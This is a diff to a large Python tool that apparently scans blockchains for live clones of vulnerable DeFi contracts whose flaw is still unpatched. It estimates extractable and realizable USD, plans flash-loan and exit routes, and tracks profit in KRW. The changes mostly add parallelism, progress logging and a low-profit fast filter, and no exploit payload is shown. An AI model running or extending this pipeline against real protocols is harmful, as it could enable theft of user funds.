-            -(1 if nt in closure_erc20_seed_set else 0),
             -(1 if (wnative_norm and nt == wnative_norm) else 0),
+            -(1 if nt in closure_erc20_seed_set else 0),
             -(1 if nt in dec_norm_map else 0),
             idx_o,
         )
@@ -34159,6 +35335,15 @@ def audit_single_protocol(
                 }
             )
             _write_json_atomic(ckpt_path, ckpt)
+        _emit_progress(
+            "S1_SEEDS_PINNED",
+            slug=slug,
+            chain=chain,
+            block_pin=block_pin,
+            session_id=eff_sid,
+            detail=f"mode={mode} seeds={len(seed_addrs)} resume={resumed_from_stage or '-'}",
+            router=router,
+        )
 
         # ── Step 2: Mode B 선행 전 체인 유사 바이트코드 확장 + E1 역방향 신뢰 폐포 + 병렬 검증 소스 조회 ──
         if bool(ckpt.get("closure_ready", False)) and isinstance(ckpt.get("closure"), dict):
@@ -34170,11 +35355,13 @@ def audit_single_protocol(
             remediation_exhausted["source_3tier_tried"] = True
         else:
             is_matched_clone_slug = slug.startswith(("modeb-match-", "modeb-clone-"))
+            modeb_initial_res: Dict[str, ProxyResolution] = {}
             if mode == "B" and not bool(ckpt.get("mode_b_expanded", False)):
                 try:
                     seed_res = _resolve_proxy_and_delegates(router, chain, seed_addrs, block_pin)
                 except Exception:
                     seed_res = {}
+                modeb_initial_res.update(seed_res)
                 if is_matched_clone_slug and _are_matched_mode_b_proxies_patched(
                     router, store, slug, chain, block_pin, seed_addrs, seed_res
                 ):
@@ -34187,15 +35374,17 @@ def audit_single_protocol(
                 seed_bytecodes: List[bytes] = []
                 seen_seed_bytecodes: Set[bytes] = set()
                 recovered_seed_count = 0
-                for s_addr in seed_addrs:
+
+                def _recover_seed_hist(s_addr: str) -> Tuple[List[bytes], bool]:
                     s_r = seed_res.get(_norm_addr(s_addr))
-                    found_for_seed = False
+                    loc_bcs: List[bytes] = []
+                    found_loc = False
                     if s_r is not None:
                         for _fa, chx in (s_r.impl_codes_hex or {s_addr: s_r.effective_code_hex}).items():
                             rb = _hex_to_bytes(chx)
                             if len(rb) >= 16:
-                                _append_unique(seed_bytecodes, seen_seed_bytecodes, rb)
-                                found_for_seed = True
+                                loc_bcs.append(rb)
+                                found_loc = True
                         if block_pin > 0 and (
                             s_r.proxy_kind != "none"
                             or any(nm == "DELEGATECALL" for _, nm, _ in _disassemble(_hex_to_bytes(s_r.raw_code_hex)))
@@ -34204,16 +35393,26 @@ def audit_single_protocol(
                                 router, chain, s_addr, block_pin, hint_blocks=mode_b_hint_blocks
                             ):
                                 if len(hist_rb) >= 16:
-                                    _append_unique(seed_bytecodes, seen_seed_bytecodes, hist_rb)
-                                    found_for_seed = True
-                    if not found_for_seed and block_pin > 0:
+                                    loc_bcs.append(hist_rb)
+                                    found_loc = True
+                    if not found_loc and block_pin > 0:
                         hist_hex = _recover_historical_bytecode_bisect(
                             router, chain, s_addr, block_pin, hint_blocks=mode_b_hint_blocks
                         )
                         rb_hist = _hex_to_bytes(hist_hex)
                         if len(rb_hist) >= 16:
-                            _append_unique(seed_bytecodes, seen_seed_bytecodes, rb_hist)
-                            found_for_seed = True
+                            loc_bcs.append(rb_hist)
+                            found_loc = True
+                    return loc_bcs, found_loc
+
+                if block_pin > 0 and len(seed_addrs) > 1 and _is_live_real_router(router):
+                    with concurrent.futures.ThreadPoolExecutor(max_workers=min(12, len(seed_addrs))) as ex_rh:
+                        rec_results = list(ex_rh.map(_recover_seed_hist, seed_addrs))
+                else:
+                    rec_results = [_recover_seed_hist(sa) for sa in seed_addrs]
+                for loc_bcs, found_for_seed in rec_results:
+                    for rb_loc in loc_bcs:
+                        _append_unique(seed_bytecodes, seen_seed_bytecodes, rb_loc)
                     if found_for_seed:
                         recovered_seed_count += 1
 
@@ -34277,7 +35476,7 @@ def audit_single_protocol(
                                 )
                             except Exception:
                                 pass
-                        if block_pin > 0 and seed_addrs:
+                        if not is_matched_clone_slug and block_pin > 0 and seed_addrs:
                             if is_live_rpc:
                                 priority_sweep_keys = list(
                                     dict.fromkeys(
@@ -34442,31 +35641,45 @@ def audit_single_protocol(
                                 ]
                             )
                         )[:12]
-                        if block_pin > 0 and same_chain_impls:
+                        excl_live = infra_set | set(seed_addrs) | {
+                            na_ex for c_ex in sim_candidates if (na_ex := _norm_addr(str(c_ex.get("address") or "")))
+                        }
+
+                        def _task_rev_up() -> Tuple[List[str], List[Dict[str, Any]]]:
+                            if not (block_pin > 0 and same_chain_impls):
+                                return [], []
                             try:
-                                for rev_px in _find_reverse_upgraded_proxies(
+                                revs = _find_reverse_upgraded_proxies(
                                     router, chain, same_chain_impls, block_pin, exclude_addrs=infra_set
-                                ):
-                                    n_rev = _norm_addr(rev_px)
-                                    if n_rev:
-                                        pre_verified_proxies.add(n_rev)
-                                    sim_candidates.append(
-                                        {
-                                            "chain_id": cid_target,
-                                            "chain": chain,
-                                            "address": rev_px,
-                                            "match_type": "proxy_impl",
-                                            "similarity": 0.98,
-                                            "seed_index": 0,
-                                            "patch_rank_delta": 350,
-                                            "vuln_preserved": True,
-                                            "patch_kind": "clone_live_delegate",
-                                        }
-                                    )
+                                )
                             except Exception:
-                                pass
+                                return [], []
+                            p_out: List[str] = []
+                            c_out: List[Dict[str, Any]] = []
+                            for rev_px in revs:
+                                n_rev = _norm_addr(rev_px)
+                                if n_rev:
+                                    p_out.append(n_rev)
+                                c_out.append(
+                                    {
+                                        "chain_id": cid_target,
+                                        "chain": chain,
+                                        "address": rev_px,
+                                        "match_type": "proxy_impl",
+                                        "similarity": 0.98,
+                                        "seed_index": 0,
+                                        "patch_rank_delta": 350,
+                                        "vuln_preserved": True,
+                                        "patch_kind": "clone_live_delegate",
+                                    }
+                                )
+                            return p_out, c_out
+
+                        def _task_fac_clones() -> Tuple[List[str], List[Dict[str, Any]]]:
+                            if not (block_pin > 0 and same_chain_impls):
+                                return [], []
                             try:
-                                for fac_c in _discover_onchain_factory_clones(
+                                facs = _discover_onchain_factory_clones(
                                     router,
                                     chain,
                                     same_chain_impls,
@@ -34474,52 +35687,128 @@ def audit_single_protocol(
                                     block_pin,
                                     exclude_addrs=infra_set | set(seed_addrs),
                                     key_identifiers=b_key_ids,
-                                ):
-                                    n_fc = _norm_addr(str(fac_c.get("address") or ""))
-                                    if n_fc and "proxy" in str(fac_c.get("match_type") or ""):
-                                        pre_verified_proxies.add(n_fc)
-                                    sim_candidates.append(fac_c)
+                                )
                             except Exception:
-                                pass
-                        if not is_matched_clone_slug and block_pin > 0 and seed_bytecodes:
+                                return [], []
+                            p_out: List[str] = []
+                            c_out: List[Dict[str, Any]] = []
+                            for fac_c in facs:
+                                n_fc = _norm_addr(str(fac_c.get("address") or ""))
+                                if n_fc and "proxy" in str(fac_c.get("match_type") or ""):
+                                    p_out.append(n_fc)
+                                c_out.append(fac_c)
+                            return p_out, c_out
+
+                        def _task_live_and_bs(seed_src_arg: Optional[Dict[str, str]]) -> List[Dict[str, Any]]:
+                            out_lb: List[Dict[str, Any]] = []
+                            if not is_matched_clone_slug and block_pin > 0 and seed_bytecodes:
+                                try:
+                                    out_lb.extend(
+                                        _discover_recent_live_deployments(
+                                            router,
+                                            chain,
+                                            seed_bytecodes,
+                                            block_pin,
+                                            store=store,
+                                            exclude_addrs=excl_live,
+                                            key_identifiers=b_key_ids,
+                                            seed_sources=seed_src_arg,
+                                        )
+                                    )
+                                except Exception:
+                                    pass
+                                try:
+                                    out_lb.extend(
+                                        _search_blockscout_similar_contracts(
+                                            router,
+                                            chain,
+                                            seed_bytecodes,
+                                            block_pin=block_pin,
+                                            exclude_addrs=excl_live,
+                                            key_identifiers=b_key_ids,
+                                            seed_sources=seed_src_arg,
+                                        )
+                                    )
+                                except Exception:
+                                    pass
+                            return out_lb
+
+                        def _load_seed_src_live() -> Optional[Dict[str, str]]:
+                            if not (not is_matched_clone_slug and block_pin > 0 and seed_bytecodes):
+                                return None
                             try:
-                                seed_src_for_live: Optional[Dict[str, str]] = None
                                 if cid_target > 0 and _has_sourcify_corpus_files(SOURCIFY_PARQUET_DIR):
                                     for sa_s in seed_addrs[:2]:
                                         loc_sv = _query_local_sourcify_verified(cid_target, sa_s)
                                         if isinstance(loc_sv, dict) and loc_sv.get("verified") and isinstance(loc_sv.get("sources"), dict):
-                                            seed_src_for_live = dict(loc_sv["sources"])
-                                            break
-                                if seed_src_for_live is None and cid_target > 0 and seed_addrs:
-                                    seed_src_for_live = _fetch_etherscan_v2_source_for_addr(router, cid_target, seed_addrs[0])
-                                excl_live = infra_set | set(seed_addrs) | {
-                                    na_ex for c_ex in sim_candidates if (na_ex := _norm_addr(str(c_ex.get("address") or "")))
-                                }
-                                sim_candidates.extend(
-                                    _discover_recent_live_deployments(
-                                        router,
-                                        chain,
-                                        seed_bytecodes,
-                                        block_pin,
-                                        store=store,
-                                        exclude_addrs=excl_live,
-                                        key_identifiers=b_key_ids,
-                                        seed_sources=seed_src_for_live,
-                                    )
-                                )
-                                sim_candidates.extend(
-                                    _search_blockscout_similar_contracts(
-                                        router,
-                                        chain,
-                                        seed_bytecodes,
-                                        block_pin=block_pin,
-                                        exclude_addrs=excl_live,
-                                        key_identifiers=b_key_ids,
-                                        seed_sources=seed_src_for_live,
-                                    )
-                                )
+                                            return dict(loc_sv["sources"])
+                                if cid_target > 0 and seed_addrs:
+                                    return _fetch_etherscan_v2_source_for_addr(router, cid_target, seed_addrs[0])
                             except Exception:
                                 pass
+                            return None
+
+                        if is_live_rpc:
+                            with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex_s2:
+                                fut_rev = ex_s2.submit(_task_rev_up)
+                                fut_fac = ex_s2.submit(_task_fac_clones)
+                                seed_src_for_live = _load_seed_src_live()
+                                fut_rec_live = (
+                                    ex_s2.submit(
+                                        lambda: _discover_recent_live_deployments(
+                                            router,
+                                            chain,
+                                            seed_bytecodes,
+                                            block_pin,
+                                            store=store,
+                                            exclude_addrs=excl_live,
+                                            key_identifiers=b_key_ids,
+                                            seed_sources=seed_src_for_live,
+                                        )
+                                    )
+                                    if (not is_matched_clone_slug and block_pin > 0 and seed_bytecodes)
+                                    else None
+                                )
+                                fut_bs_live = (
+                                    ex_s2.submit(
+                                        lambda: _search_blockscout_similar_contracts(
+                                            router,
+                                            chain,
+                                            seed_bytecodes,
+                                            block_pin=block_pin,
+                                            exclude_addrs=excl_live,
+                                            key_identifiers=b_key_ids,
+                                            seed_sources=seed_src_for_live,
+                                        )
+                                    )
+                                    if (not is_matched_clone_slug and block_pin > 0 and seed_bytecodes)
+                                    else None
+                                )
+                                rev_pxs, rev_cands = fut_rev.result()
+                                fac_pxs, fac_cands = fut_fac.result()
+                                pre_verified_proxies.update(rev_pxs)
+                                pre_verified_proxies.update(fac_pxs)
+                                sim_candidates.extend(rev_cands)
+                                sim_candidates.extend(fac_cands)
+                                if fut_rec_live is not None:
+                                    try:
+                                        sim_candidates.extend(fut_rec_live.result())
+                                    except Exception:
+                                        pass
+                                if fut_bs_live is not None:
+                                    try:
+                                        sim_candidates.extend(fut_bs_live.result())
+                                    except Exception:
+                                        pass
+                        else:
+                            rev_pxs, rev_cands = _task_rev_up()
+                            fac_pxs, fac_cands = _task_fac_clones()
+                            pre_verified_proxies.update(rev_pxs)
+                            pre_verified_proxies.update(fac_pxs)
+                            sim_candidates.extend(rev_cands)
+                            sim_candidates.extend(fac_cands)
+                            seed_src_for_live = _load_seed_src_live()
+                            sim_candidates.extend(_task_live_and_bs(seed_src_for_live))
 
                     # 후보 정렬: (1) 정확/골격/프록시 매칭 유형 우선순위, (2) 패치 미적용 오픈싱크 보전 + 유사도 점수 내림차순, (3) 유동성/시드 순번 결정론적 정렬
                     def _cand_sort_key(c: Dict[str, Any]) -> Tuple[int, Decimal, Decimal, Decimal, str, str, int]:
@@ -34566,6 +35855,7 @@ def audit_single_protocol(
                                 )
                             except Exception:
                                 verified_p_map = {}
+                            modeb_initial_res.update(verified_p_map)
                             for pa_v in unverified_same_chain_proxies:
                                 pr_v = verified_p_map.get(pa_v)
                                 raw_b_v = _hex_to_bytes(pr_v.raw_code_hex) if pr_v is not None else b""
@@ -34688,6 +35978,7 @@ def audit_single_protocol(
                 seed_addresses=seed_addrs,
                 block_pin=block_pin,
                 protocol_tvl_hint_usd=tvl_usd,
+                initial_resolutions=modeb_initial_res,
             )
             remediation_exhausted["exit_liquidity_checked"] = True
 
@@ -34803,6 +36094,30 @@ def audit_single_protocol(
                 }
             )
             _write_json_atomic(ckpt_path, ckpt)
+        _emit_progress(
+            "S2_CLOSURE_READY",
+            slug=slug,
+            chain=chain,
+            block_pin=block_pin,
+            session_id=eff_sid,
+            detail=(
+                f"addrs={len(closure.all_addresses)} max_usd=${closure.max_extractable_usd:.2f} "
+                f"real_usd=${closure.realizable_extractable_usd:.2f} toks={len(closure.token_decimals)}"
+            ),
+            router=router,
+        )
+
+        if mode == "B":
+            _ff_real_d = _to_dec(closure.realizable_extractable_usd_dec or closure.realizable_extractable_usd)
+            _ff_meta = store.get_proto_meta(slug) if store is not None else {}
+            _ff_sim = float(_ff_meta.get("mode_b_similarity") or 0.0)
+            _ff_pres = _ff_meta.get("mode_b_vuln_preserved")
+            if _ff_real_d < PROFIT_FLOOR_DEC or (_ff_sim < 0.8 and _ff_pres is not True):
+                return _finish_safe(
+                    f"Fast-filter E1: low realizable or low-similarity unpreserved clone real_usd={float(_ff_real_d):.2f} similarity={_ff_sim:.4f} vuln_preserved={_ff_pres}",
+                    early_exit_tag="E1_FAST_FILTER_LOW_VALUE_OR_UNPRESERVED",
+                    extra_fields={"realizable_usd": round(float(_ff_real_d), 2), "similarity": _ff_sim},
+                )
 
         seed_set = set(closure.seed_addresses)
         protocol_vault_addrs = [
@@ -35130,7 +36445,7 @@ def audit_single_protocol(
                         router, chain, target_a, skip_local_sourcify=skip_sf
                     )
 
-                with concurrent.futures.ThreadPoolExecutor(max_workers=min(6, len(missing_src_targets))) as src_pool:
+                with concurrent.futures.ThreadPoolExecutor(max_workers=min(12, len(missing_src_targets))) as src_pool:
                     for t_a, vinfo in src_pool.map(_fetch_one_src, missing_src_targets):
                         if isinstance(vinfo, dict) and vinfo.get("verified"):
                             verified_sources[t_a] = vinfo
@@ -35371,7 +36686,35 @@ def audit_single_protocol(
             for a_sp, ve_sp in closure.vault_exposures.items()
             if _norm_addr(a_sp) and _ve_allow_dec(ve_sp) > _DEC_ZERO and _norm_addr(a_sp) not in infra_set
         ][:12]
-        harness_vault_addrs = list(dict.fromkeys([*protocol_vault_addrs, *active_approved_owners]))
+        _owner_set_s4 = {_norm_addr(ao) for ao in active_approved_owners if _norm_addr(ao)}
+        _keep_v_s4: Set[str] = set(seed_set) | _owner_set_s4 | ({_norm_addr(primary_target)} if _norm_addr(primary_target) else set())
+        for _sl_v in prescreened[:48]:
+            for _lt_v in (_sl_v.leg_targets or ()):
+                _n_lt = _norm_addr(_lt_v)
+                if _n_lt:
+                    _keep_v_s4.add(_n_lt)
+
+        def _has_any_exposure_s4(addr_v: str) -> bool:
+            ve_v = closure.vault_exposures.get(addr_v)
+            if ve_v is None:
+                return False
+            if int(ve_v.native_wei or 0) > 0 or _ve_allow_dec(ve_v) > _DEC_ZERO:
+                return True
+            return any(int(bv or 0) > 0 for bv in (ve_v.token_balances or {}).values())
+
+        _raw_hv_s4 = [
+            a_v for a_v in dict.fromkeys([*protocol_vault_addrs, *active_approved_owners])
+            if a_v in _keep_v_s4 or _has_any_exposure_s4(a_v)
+        ] or list(dict.fromkeys([*protocol_vault_addrs, *active_approved_owners]))
+        harness_vault_addrs = sorted(
+            _raw_hv_s4,
+            key=lambda a_v: (
+                0 if (_has_any_exposure_s4(a_v) or a_v == _norm_addr(primary_target)) else 1,
+                -(_ve_total_dec(closure.vault_exposures[a_v]) if a_v in closure.vault_exposures else _DEC_ZERO),
+                0 if (a_v in seed_set or a_v in _owner_set_s4) else 1,
+                a_v,
+            ),
+        )
         s4_target_addrs = list(dict.fromkeys([primary_target, *protocol_vault_addrs, *ext_spenders_s4, *closure.all_addresses]))
         gas_price_w = fetch_gas_price_wei(router, chain, block_pin) if block_pin > 0 else 1_000_000_000
         flash_plan_s4 = discover_optimal_flash_sources_for_tokens(
@@ -35384,6 +36727,15 @@ def audit_single_protocol(
             decimals_map=closure.token_decimals,
             prices_map=_closure_prices_lookup(closure),
         )
+        _emit_progress(
+            "S3_SLICES_READY",
+            slug=slug,
+            chain=chain,
+            block_pin=block_pin,
+            session_id=eff_sid,
+            detail=f"slices={len(prescreened[:48])} tokens={len(token_addrs)} open_targets={len(open_summary)}",
+            router=router,
+        )
         forge_out = generate_and_run_forge_suites(
             router=router,
             slug=slug,
@@ -35393,13 +36745,16 @@ def audit_single_protocol(
             target_addr=primary_target,
             token_addrs=token_addrs,
             slices=prescreened[:48],
+            timeout_sec=150,
             ckpt_path=ckpt_path,
             ckpt_data=ckpt,
-            slice_chunk_size=8,
+            slice_chunk_size=12,
             vault_addresses=harness_vault_addrs,
             gas_price_wei=gas_price_w,
             exit_routes=closure.verified_exit_pools,
+            max_tests_per_chunk=48,
             target_addrs=s4_target_addrs,
+            session_id=eff_sid,
         )
 
         forge_payload = {
@@ -35439,6 +36794,15 @@ def audit_single_protocol(
                 closure.token_decimals,
             )
             if flash_slices_s4:
+                _emit_progress(
+                    "S4_FLASH_VERIFY",
+                    slug=slug,
+                    chain=chain,
+                    block_pin=block_pin,
+                    session_id=eff_sid,
+                    detail=f"flash_slices={len(flash_slices_s4)}",
+                    router=router,
+                )
                 flash_out = generate_and_run_forge_suites(
                     router=router,
                     slug=slug,
@@ -35448,14 +36812,16 @@ def audit_single_protocol(
                     target_addr=primary_target,
                     token_addrs=token_addrs,
                     slices=flash_slices_s4,
+                    timeout_sec=150,
                     ckpt_path=None,
                     ckpt_data={"completed_chunks": 800},
-                    slice_chunk_size=4,
+                    slice_chunk_size=8,
                     vault_addresses=harness_vault_addrs,
                     gas_price_wei=gas_price_w,
                     exit_routes=closure.verified_exit_pools,
-                    max_tests_per_chunk=16,
+                    max_tests_per_chunk=24,
                     target_addrs=s4_target_addrs,
+                    session_id=eff_sid,
                 )
                 if flash_out.executed:
                     _merge_s4_forge_outcome(flash_out)
@@ -35631,6 +36997,7 @@ def audit_single_protocol(
                             exit_routes=closure.verified_exit_pools,
                             max_tests_per_chunk=20,
                             target_addrs=s4_target_addrs,
+                            session_id=eff_sid,
                         )
                         if ref_out.conservation_gains:
                             s4_ref_rel = f"test/Verify_{_safe_solidity_ident(slug)}_900.t.sol"
@@ -36037,7 +37404,23 @@ def cmd_run(session_id: Optional[str] = None) -> int:
             return {ns for x in raw_list if x and (ns := _norm_slug(str(x)))}
 
         owned_pre = _session_owned_slugs(sess)
+        if owned_pre:
+            _emit_progress(
+                "AGENT_VERIFY_START",
+                slug=",".join(sorted(owned_pre)[:2]),
+                session_id=sid,
+                detail=f"checking={len(owned_pre)} owned slug(s)",
+                router=router,
+            )
         agent_handled = process_agent_submissions(router, store, only_slugs=owned_pre) if owned_pre else 0
+        if owned_pre:
+            _emit_progress(
+                "AGENT_VERIFY_DONE",
+                slug=",".join(sorted(owned_pre)[:2]),
+                session_id=sid,
+                detail=f"handled={agent_handled}",
+                router=router,
+            )
         sess = store.get_session(sid) or sess
         owned_now = _session_owned_slugs(sess)
 
@@ -36076,7 +37459,7 @@ def cmd_run(session_id: Optional[str] = None) -> int:
         )
         has_blocking_agent_req = bool(pending_pre_a or pending_pre_p or pending_pre_v)
 
-        run_sweep_budget_sec = 180.0
+        run_sweep_budget_sec = 900.0
         if not sess.get("profit_slug") and not has_blocking_agent_req:
             c_phase = _get_mode_b_sourcify_cursor_phase(store, SOURCIFY_PARQUET_DIR)
             if c_phase != "exhausted":
@@ -36142,6 +37525,14 @@ def cmd_run(session_id: Optional[str] = None) -> int:
                                 continue
                     break
                 fast_lock_misses = 0
+                _emit_progress(
+                    "CLAIM_TARGET",
+                    slug=str(item.get("slug") or ""),
+                    chain=str(item.get("chain") or ""),
+                    session_id=sid,
+                    detail=f"mode={item.get('mode')} tvl=${float(item.get('tvl_usd') or 0):,.2f}",
+                    router=router,
+                )
                 res_item = audit_single_protocol(
                     router,
                     store,
@@ -36149,6 +37540,18 @@ def cmd_run(session_id: Optional[str] = None) -> int:
                     proven_vaults,
                     proven_lock=proven_lock,
                     session_id=sid,
+                )
+                _emit_progress(
+                    "TARGET_RESULT",
+                    slug=str(res_item.get("slug") or ""),
+                    chain=str(res_item.get("chain") or ""),
+                    block_pin=int(res_item.get("audit_block") or 0),
+                    session_id=sid,
+                    detail=(
+                        f"verdict={res_item.get('verdict')} early_exit={res_item.get('early_exit','NONE')} "
+                        f"needs_agent={bool(res_item.get('needs_agent', False))} net_krw={int(res_item.get('net_krw') or 0):,}"
+                    ),
+                    router=router,
                 )
                 processed.append(_batch_entry_summary(res_item))
                 sess = store.get_session(sid) or sess
@@ -36290,6 +37693,14 @@ def cmd_run(session_id: Optional[str] = None) -> int:
             "status_token": status_token,
             "next_step": next_step,
         }
+        _emit_progress(
+            "RUN_DONE",
+            slug=str(sess.get("profit_slug") or sess.get("active_slug") or ""),
+            session_id=sid,
+            detail=f"status={status_token} done={q_counts.get('done', 0)} pending={q_counts.get('pending', 0)}",
+            router=router,
+            extra={"queue_counts": q_counts, "status_token": status_token, "active_request_files": active_request_files},
+        )
         print(json.dumps(summary, ensure_ascii=False, indent=2))
         print(status_token)
         return 0
@@ -36352,6 +37763,9 @@ _ALLOWED_ROOT_ENTRIES: FrozenSet[str] = frozenset(
         "Defi_구현_test.py",
         "audit_artifacts",
         "game",
+        "node_modules",
+        "package.json",
+        "package-lock.json",
         "python.exe",
         "python312._pth",
         "python312.dll",
@@ -36832,6 +38246,13 @@ def cmd_selftest(tags: Optional[Sequence[str]] = None) -> int:
 
 
 def main() -> int:
+    for _stream in (sys.stdout, sys.stderr):
+        _reconf = getattr(_stream, "reconfigure", None)
+        if callable(_reconf):
+            try:
+                _reconf(line_buffering=True)
+            except Exception:
+                pass
     args = sys.argv[1:]
     if not args:
         print(f"Usage: {Path(sys.argv[0]).name} [run [session_id]|done [session_id]|selftest [tags...]]", file=sys.stderr)
